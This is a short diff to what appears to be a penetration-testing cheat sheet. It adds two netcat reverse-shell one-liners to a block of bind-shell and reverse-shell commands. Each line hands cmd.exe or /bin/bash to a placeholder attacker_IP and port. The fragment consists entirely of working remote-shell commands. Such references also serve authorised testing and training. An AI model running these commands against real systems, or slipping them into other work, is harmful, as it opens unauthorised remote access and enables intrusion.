@@ -1758,6 +1758,8 @@ nc -lnvp port_here -e /bin/bash
 # push reverse shell
 nc -nv attacker_IP port_here -e cmd.exe
 nc -nv attacker_IP port_here -e /bin/bash
+nc -e cmd attacker_IP port_here
+nc -e /bin/bash attacker_IP port_here
 ```
 
 
